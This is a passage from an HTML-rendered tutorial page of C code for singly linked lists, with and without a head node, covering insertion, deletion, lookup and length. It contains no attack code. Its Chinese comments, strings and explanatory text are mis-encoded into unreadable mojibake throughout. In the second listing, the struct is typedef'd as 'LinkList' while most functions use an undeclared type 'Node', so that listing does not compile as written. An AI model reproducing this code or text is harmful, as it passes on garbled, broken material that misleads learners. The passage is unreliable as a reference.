class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d -&gt; &quot;</span>, p-&gt;data);<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NULL\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// æŒ‰å€¼åˆ é™¤èŠ‚ç‚¹</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Delete</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> value)</span> &#123;<br>    Node *p = head; <span class="hljs-comment">// ä»å¤´èŠ‚ç‚¹å¼€å§‹</span><br>    <span class="hljs-keyword">while</span> (p-&gt;next != <span class="hljs-literal">NULL</span> &amp;&amp; p-&gt;next-&gt;data != value) &#123;<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (p-&gt;next != <span class="hljs-literal">NULL</span>) &#123;<br>        Node *temp = p-&gt;next; <span class="hljs-comment">// æ‰¾åˆ°è¦åˆ é™¤çš„èŠ‚ç‚¹</span><br>        p-&gt;next = temp-&gt;next; <span class="hljs-comment">// é‡æ–°è¿æ¥é“¾è¡¨</span><br>        <span class="hljs-built_in">free</span>(temp);           <span class="hljs-comment">// é‡Šæ”¾èŠ‚ç‚¹å†…å­˜</span><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// æŒ‰åºå·åˆ é™¤èŠ‚ç‚¹</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">DeleteAt</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> index)</span> &#123;<br>    <span class="hljs-keyword">if</span> (index &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ— æ•ˆçš„ç´¢å¼•\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    Node *p = head;<br>    <span class="hljs-type">int</span> currentIndex = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (p-&gt;next != <span class="hljs-literal">NULL</span> &amp;&amp; currentIndex &lt; index) &#123;<br>        p = p-&gt;next;<br>        currentIndex++;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (p-&gt;next != <span class="hljs-literal">NULL</span>) &#123;<br>        Node *temp = p-&gt;next; <span class="hljs-comment">// æ‰¾åˆ°è¦åˆ é™¤çš„èŠ‚ç‚¹</span><br>        p-&gt;next = temp-&gt;next; <span class="hljs-comment">// é‡æ–°è¿æ¥é“¾è¡¨</span><br>        <span class="hljs-built_in">free</span>(temp);           <span class="hljs-comment">// é‡Šæ”¾èŠ‚ç‚¹å†…å­˜</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ç´¢å¼•è¶…å‡ºèŒƒå›´\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// æŒ‰å€¼æŸ¥æ‰¾èŠ‚ç‚¹</span><br>Node* <span class="hljs-title function_">FindByValue</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> value)</span> &#123;<br>    Node *p = head-&gt;next; <span class="hljs-comment">// ä»ç¬¬ä¸€ä¸ªæœ‰æ•ˆèŠ‚ç‚¹å¼€å§‹</span><br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">if</span> (p-&gt;data == value) &#123;<br>            <span class="hljs-keyword">return</span> p;<br>        &#125;<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// æœªæ‰¾åˆ°åŒ¹é…çš„èŠ‚ç‚¹</span><br>&#125;<br><br><span class="hljs-comment">// æŒ‰åºå·æŸ¥æ‰¾èŠ‚ç‚¹</span><br>Node* <span class="hljs-title function_">FindByIndex</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> index)</span> &#123;<br>    <span class="hljs-keyword">if</span> (index &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    Node *p = head-&gt;next;<br>    <span class="hljs-type">int</span> currentIndex = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span> &amp;&amp; currentIndex &lt; index) &#123;<br>        p = p-&gt;next;<br>        currentIndex++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> p; <span class="hljs-comment">// å¦‚æœç´¢å¼•è¶…å‡ºèŒƒå›´ï¼Œå°†è¿”å› NULL</span><br>&#125;<br><br><span class="hljs-comment">// æ±‚é“¾è¡¨é•¿åº¦</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">GetLength</span><span class="hljs-params">(Node *head)</span> &#123;<br>    <span class="hljs-type">int</span> length = <span class="hljs-number">0</span>;<br>    Node *p = head-&gt;next;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        length++;<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> length;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    Node *head = InitList(); <span class="hljs-comment">// åˆå§‹åŒ–å¸¦å¤´èŠ‚ç‚¹çš„é“¾è¡¨</span><br><br>    <span class="hljs-comment">// æ’å…¥ä¸€äº›èŠ‚ç‚¹</span><br>    Insert(head, <span class="hljs-number">10</span>);<br>    Insert(head, <span class="hljs-number">20</span>);<br>    Insert(head, <span class="hljs-number">30</span>);<br>    Insert(head, <span class="hljs-number">40</span>);<br><br>    <span class="hljs-comment">// æ‰“å°é“¾è¡¨å†…å®¹</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é“¾è¡¨å†…å®¹ä¸ºï¼š&quot;</span>);<br>    PrintList(head);<br><br>    <span class="hljs-comment">// åœ¨å€¼ä¸º30çš„èŠ‚ç‚¹ä¹‹å‰æ’å…¥å€¼ä¸º25çš„èŠ‚ç‚¹</span><br>    InsertBefore(head, head-&gt;next-&gt;next, <span class="hljs-number">25</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;åœ¨å€¼ä¸º30çš„èŠ‚ç‚¹ä¹‹å‰æ’å…¥å€¼ä¸º25çš„èŠ‚ç‚¹åé“¾è¡¨å†…å®¹ä¸ºï¼š&quot;</span>);<br>    PrintList(head);<br><br>    <span class="hljs-comment">// åœ¨å€¼ä¸º25çš„èŠ‚ç‚¹ä¹‹åæ’å…¥å€¼ä¸º27çš„èŠ‚ç‚¹</span><br>    InsertAfter(head-&gt;next-&gt;next, <span class="hljs-number">27</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;åœ¨å€¼ä¸º25çš„èŠ‚ç‚¹ä¹‹åæ’å…¥å€¼ä¸º27çš„èŠ‚ç‚¹åé“¾è¡¨å†…å®¹ä¸ºï¼š&quot;</span>);<br>    PrintList(head);<br><br>    <span class="hljs-comment">// åˆ é™¤å€¼ä¸º20çš„èŠ‚ç‚¹</span><br>    Delete(head, <span class="hljs-number">20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;åˆ é™¤å€¼ä¸º20çš„èŠ‚ç‚¹åé“¾è¡¨å†…å®¹ä¸ºï¼š&quot;</span>);<br>    PrintList(head);<br><br>    <span class="hljs-comment">// æŒ‰åºå·åˆ é™¤èŠ‚ç‚¹</span><br>    DeleteAt(head, <span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;åˆ é™¤ç´¢å¼•ä¸º2çš„èŠ‚ç‚¹åé“¾è¡¨å†…å®¹ä¸ºï¼š&quot;</span>);<br>    PrintList(head);<br><br>    <span class="hljs-comment">// æŒ‰å€¼æŸ¥æ‰¾èŠ‚ç‚¹</span><br>    Node *foundNode = FindByValue(head, <span class="hljs-number">30</span>);<br>    <span class="hljs-keyword">if</span> (foundNode != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ‰¾åˆ°å€¼ä¸º30çš„èŠ‚ç‚¹ï¼Œåœ°å€ä¸ºï¼š%p\n&quot;</span>, foundNode);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æœªæ‰¾åˆ°å€¼ä¸º30çš„èŠ‚ç‚¹\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// æŒ‰åºå·æŸ¥æ‰¾èŠ‚ç‚¹</span><br>    foundNode = FindByIndex(head, <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> (foundNode != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ‰¾åˆ°ç´¢å¼•ä¸º1çš„èŠ‚ç‚¹ï¼Œå€¼ä¸ºï¼š%d\n&quot;</span>, foundNode-&gt;data);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æœªæ‰¾åˆ°ç´¢å¼•ä¸º1çš„èŠ‚ç‚¹\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// æ±‚é“¾è¡¨é•¿åº¦</span><br>    <span class="hljs-type">int</span> length = GetLength(head);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é“¾è¡¨é•¿åº¦ä¸ºï¼š%d\n&quot;</span>, length);<br><br>    <span class="hljs-comment">// é‡Šæ”¾é“¾è¡¨å†…å­˜</span><br>    Node *p = head;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        Node *temp = p;<br>        p = p-&gt;next;<br>        <span class="hljs-built_in">free</span>(temp);<br>    &#125;<br><br> <br></code></pre></td></tr></table></figure><p>ä¸å¸¦å¤´èŠ‚ç‚¹çš„é“¾è¡¨å®ç°</p><ol><li>æ²¡æœ‰é¢å¤–çš„å¤´èŠ‚ç‚¹ï¼Œç¬¬ä¸€ä¸ªèŠ‚ç‚¹ç›´æ¥å­˜å‚¨æœ‰æ•ˆæ•°æ®ã€‚</li><li>åœ¨å¯¹é“¾è¡¨è¿›è¡Œæ’å…¥ã€åˆ é™¤æ“ä½œæ—¶ï¼Œéœ€è¦è€ƒè™‘é“¾è¡¨ä¸ºç©ºæˆ–è€…æ“ä½œçš„èŠ‚ç‚¹ä¸ºç¬¬ä¸€ä¸ªèŠ‚ç‚¹çš„ç‰¹æ®Šæƒ…å†µã€‚</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-type">int</span> data;           <span class="hljs-comment">// æ•°æ®åŸŸï¼Œå­˜å‚¨èŠ‚ç‚¹çš„æ•°æ®</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>* <span class="hljs-title">next</span>;</span>  <span class="hljs-comment">// æŒ‡é’ˆåŸŸï¼ŒæŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹</span><br>&#125; LinkList;<br><br><br><br><span class="hljs-comment">// åˆå§‹åŒ–æ²¡æœ‰å¤´èŠ‚ç‚¹çš„é“¾è¡¨</span><br>Node* <span class="hljs-title function_">InitList</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// åˆå§‹åŒ–ä¸ºç©ºé“¾è¡¨</span><br>&#125;<br><br><span class="hljs-comment">/* ç”¨å¤´æ’æ³•å»ºç«‹ä¸€ä¸ªä¸å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨ */</span><br>LinkList *<span class="hljs-title function_">AddHead</span><span class="hljs-params">()</span> &#123;<br>    LinkList *head = <span class="hljs-literal">NULL</span>;        <span class="hljs-comment">// åˆå§‹åŒ–ä¸ºç©ºé“¾è¡¨</span><br>    LinkList *p;              <span class="hljs-comment">// ä¸´æ—¶æŒ‡é’ˆï¼Œç”¨äºæ–°èŠ‚ç‚¹çš„åˆ›å»º</span><br>    <span class="hljs-type">int</span> x;                      <span class="hljs-comment">// å­˜æ”¾è¾“å…¥æ•°æ®çš„ä¸´æ—¶å˜é‡</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥èŠ‚ç‚¹æ•°æ®ï¼ˆè¾“å…¥-1ç»“æŸï¼‰ï¼š&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;x);             <span class="hljs-comment">// è¾“å…¥ç¬¬ä¸€ä¸ªæ•°æ®</span><br><br>    <span class="hljs-keyword">while</span> (x != <span class="hljs-number">-1</span>) &#123;      <span class="hljs-comment">// å¾ªç¯æ¡ä»¶ï¼šè¾“å…¥å€¼ä¸ä¸º -1</span><br>        p = (LinkList *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(LinkList)); <span class="hljs-comment">// ç”Ÿæˆæ–°èŠ‚ç‚¹</span><br>        p-&gt;data = x;               <span class="hljs-comment">// å°†æ•°æ®å­˜å…¥æ–°èŠ‚ç‚¹</span><br>        p-&gt;next = head;        <span class="hljs-comment">// æ–°èŠ‚ç‚¹çš„ next æŒ‡å‘å½“å‰çš„å¤´æŒ‡é’ˆ</span><br>        head = p;             <span class="hljs-comment">// æ›´æ–°å¤´æŒ‡é’ˆæŒ‡å‘æ–°èŠ‚ç‚¹</span><br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;x);           <span class="hljs-comment">// ç»§ç»­è¾“å…¥ä¸‹ä¸€ä¸ªæ•°æ®</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> head;                                <span class="hljs-comment">// è¿”å›å¤´æŒ‡é’ˆ</span><br>&#125;<br><br><br><br> <span class="hljs-comment">/* å°¾æ’æ³•å»ºç«‹ä¸€ä¸ªä¸å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨ */</span><br>LinkList *<span class="hljs-title function_">AddTail</span><span class="hljs-params">()</span> &#123;<br>    LinkList *head = <span class="hljs-literal">NULL</span>;            <span class="hljs-comment">// åˆå§‹åŒ–ä¸ºç©ºé“¾è¡¨</span><br>    LinkList *p, *q = <span class="hljs-literal">NULL</span>;  <span class="hljs-comment">// p ç”¨äºæ–°èŠ‚ç‚¹çš„åˆ›å»ºï¼Œq æŒ‡å‘é“¾è¡¨çš„å°¾éƒ¨</span><br>    <span class="hljs-type">int</span> x;                     <span class="hljs-comment">// å­˜æ”¾è¾“å…¥æ•°æ®çš„ä¸´æ—¶å˜é‡</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥èŠ‚ç‚¹æ•°æ®ï¼ˆè¾“å…¥-1ç»“æŸï¼‰ï¼š&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;x);              <span class="hljs-comment">// è¾“å…¥ç¬¬ä¸€ä¸ªæ•°æ®</span><br>    <span class="hljs-keyword">while</span> (x != <span class="hljs-number">-1</span>) &#123;           <span class="hljs-comment">// å¾ªç¯æ¡ä»¶ï¼šè¾“å…¥å€¼ä¸ä¸º -1</span><br>        p = (LinkList *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(LinkList)); <span class="hljs-comment">// ç”Ÿæˆæ–°èŠ‚ç‚¹</span><br>        p-&gt;data = x;                         <span class="hljs-comment">// å°†æ•°æ®å­˜å…¥æ–°èŠ‚ç‚¹</span><br>        p-&gt;next = <span class="hljs-literal">NULL</span>;   <span class="hljs-comment">// æ–°èŠ‚ç‚¹çš„ next æŒ‡å‘ NULLï¼Œè¡¨ç¤ºé“¾è¡¨æœ«å°¾</span><br>        <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span>) &#123;                    <span class="hljs-comment">// å¦‚æœé“¾è¡¨ä¸ºç©º</span><br>            head = p;                     <span class="hljs-comment">// æ–°èŠ‚ç‚¹ä½œä¸ºç¬¬ä¸€ä¸ªèŠ‚ç‚¹</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            q-&gt;next = p;             <span class="hljs-comment">// å°¾èŠ‚ç‚¹çš„ next æŒ‡å‘æ–°èŠ‚ç‚¹</span><br>        &#125;<br>        q = p;                          <span class="hljs-comment">// æ›´æ–°å°¾æŒ‡é’ˆæŒ‡å‘æ–°èŠ‚ç‚¹</span><br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;x);                <span class="hljs-comment">// ç»§ç»­è¾“å…¥ä¸‹ä¸€ä¸ªæ•°æ®</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> head;                   <span class="hljs-comment">// è¿”å›å¤´æŒ‡é’ˆ</span><br>&#125;<br><br><br><br><span class="hljs-comment">// åœ¨é“¾è¡¨æœ«å°¾æ’å…¥æ–°èŠ‚ç‚¹</span><br>Node* <span class="hljs-title function_">Insert</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> value)</span> &#123;<br>    Node *newNode = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node)); <span class="hljs-comment">// åˆ›å»ºæ–°èŠ‚ç‚¹</span><br>    <span class="hljs-keyword">if</span> (newNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å†…å­˜åˆ†é…å¤±è´¥\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    newNode-&gt;data = value;<br>    newNode-&gt;next = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> newNode; <span class="hljs-comment">// å¦‚æœé“¾è¡¨ä¸ºç©ºï¼Œæ–°èŠ‚ç‚¹ä½œä¸ºå¤´èŠ‚ç‚¹</span><br>    &#125;<br><br>    Node *p = head; <span class="hljs-comment">// ä»å¤´èŠ‚ç‚¹å¼€å§‹</span><br>    <span class="hljs-keyword">while</span> (p-&gt;next != <span class="hljs-literal">NULL</span>) &#123;<br>        p = p-&gt;next; <span class="hljs-comment">// æ‰¾åˆ°é“¾è¡¨çš„æœ«å°¾</span><br>    &#125;<br>    p-&gt;next = newNode; <span class="hljs-comment">// å°†æ–°èŠ‚ç‚¹æ’å…¥åˆ°é“¾è¡¨æœ«å°¾</span><br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-comment">// åœ¨æŒ‡å®šèŠ‚ç‚¹ä¹‹å‰æ’å…¥æ–°èŠ‚ç‚¹ï¼ˆå‰æ’æ³•ï¼‰</span><br>Node* <span class="hljs-title function_">InsertBefore</span><span class="hljs-params">(Node *head, Node *target, <span class="hljs-type">int</span> value)</span> &#123;<br>    <span class="hljs-keyword">if</span> (target == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ç›®æ ‡èŠ‚ç‚¹ä¸ºç©ºï¼Œæ— æ³•æ’å…¥\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br><br>    Node *newNode = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node)); <span class="hljs-comment">// åˆ›å»ºæ–°èŠ‚ç‚¹</span><br>    <span class="hljs-keyword">if</span> (newNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å†…å­˜åˆ†é…å¤±è´¥\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    newNode-&gt;data = value;<br><br>    <span class="hljs-keyword">if</span> (head == target) &#123; <span class="hljs-comment">// å¦‚æœç›®æ ‡èŠ‚ç‚¹æ˜¯å¤´èŠ‚ç‚¹</span><br>        newNode-&gt;next = head;<br>        <span class="hljs-keyword">return</span> newNode; <span class="hljs-comment">// æ–°èŠ‚ç‚¹ä½œä¸ºæ–°çš„å¤´èŠ‚ç‚¹</span><br>    &#125;<br><br>    Node *p = head;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span> &amp;&amp; p-&gt;next != target) &#123;<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        newNode-&gt;next = target;<br>        p-&gt;next = newNode;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æœªæ‰¾åˆ°ç›®æ ‡èŠ‚ç‚¹\n&quot;</span>);<br>        <span class="hljs-built_in">free</span>(newNode);<br>    &#125;<br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><br><span class="hljs-comment">// åœ¨æŒ‡å®šèŠ‚ç‚¹ä¹‹åæ’å…¥æ–°èŠ‚ç‚¹ï¼ˆåæ’æ³•ï¼‰</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InsertAfter</span><span class="hljs-params">(Node *target, <span class="hljs-type">int</span> value)</span> &#123;<br>    <span class="hljs-keyword">if</span> (target == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ç›®æ ‡èŠ‚ç‚¹ä¸ºç©ºï¼Œæ— æ³•æ’å…¥\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    Node *newNode = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node)); <span class="hljs-comment">// åˆ›å»ºæ–°èŠ‚ç‚¹</span><br>    <span class="hljs-keyword">if</span> (newNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å†…å­˜åˆ†é…å¤±è´¥\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    newNode-&gt;data = value;<br>    newNode-&gt;next = target-&gt;next;<br>    target-&gt;next = newNode;<br>&#125;<br><br><span class="hljs-comment">// æ‰“å°é“¾è¡¨</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">PrintList</span><span class="hljs-params">(Node *head)</span> &#123;<br>    Node *p = head; <span class="hljs-comment">// ä»å¤´èŠ‚ç‚¹å¼€å§‹</span><br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d -&gt; &quot;</span>, p-&gt;data);<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NULL\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// æŒ‰å€¼åˆ 